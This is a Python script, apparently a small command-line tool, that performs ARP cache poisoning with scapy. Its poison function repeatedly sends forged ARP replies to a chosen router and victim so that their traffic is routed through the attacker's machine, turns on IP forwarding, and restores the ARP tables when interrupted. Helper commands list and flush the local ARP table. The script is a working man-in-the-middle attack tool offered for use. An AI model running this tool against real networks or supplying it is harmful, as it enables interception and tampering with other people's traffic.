#!/usr/bin/env python


import sh
import re
import argh
import time
import utils
import signal
import logging
import itertools
from scapy.all import *


def _arp_registered_MAC(ip, interface=Ether):
    return srp(ARP(pdst=ip), timeout=5, retry=3)[0][1][interface].src


def _load_mac_table():
    pattern = re.compile(r' \((\d+\.\d+\.\d+.\d+)\) at ([0-9a-f:]{17}) \[[\w]+\] on (\w+)')

    results = {}
    for line in sh.arp('-a'):
        match = pattern.search(line)
        if not match:
            continue

        ip, mac, interface = match.group(1), match.group(2), match.group(3)
        if interface not in results:
            results[interface] = list()
        results[interface].append((ip, mac))

    return results


def poison(routerIP, victimIP, attackerIP, interface='eth0'):
    routerMAC = _arp_registered_MAC(routerIP)
    victimMAC = _arp_registered_MAC(victimIP)
    attackerMAC = _arp_registered_MAC(attackerIP)
    if not routerMAC or not victimMAC or not attackerMAC:
        logging.error('''Could not determine all parties MACs:\n
                      \t router   IP: {rip} \t MAC: {rmac} \n
                      \t victim   IP: {vip} \t MAC: {vmac} \n
                      \t attacker IP: {aip} \t MAC: {amac} \n
                      '''.format(rip=routerIP, rmac=routerMAC,
                                 vip=victimIP, vmac=victimMAC,
                                 aip=attackerIP, amac=attackerMAC))
        return

    def _signal_handler(signal, frame):
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC))
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC))

    with utils.ip_forwarding():
        signal.signal(signal.SIGINT, _signal_handler)
        while True:
            send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=attackerMAC, hwsrc=victimMAC), count=3)
            send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=attackerMAC, hwsrc=routerMAC), count=3)
            time.sleep(2)


def verify():
    pass


def monitor():
    pass


def display():
    for interface, entries in _load_mac_table().items():
        print 'Interface %s (%i items)' % (interface, len(entries))
        for ip, mac in sorted(entries):
            print '\t %s \t %s' % (ip, mac)
        print


def flush(ip=None):
    entries = [(ip, None)] if ip else itertools.chain(*_load_mac_table().values())
    for ip, _ in entries:
        sh.arp('-d', ip)


if __name__ == '__main__':
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    argh.dispatch_commands([poison, flush, verify, monitor, display])
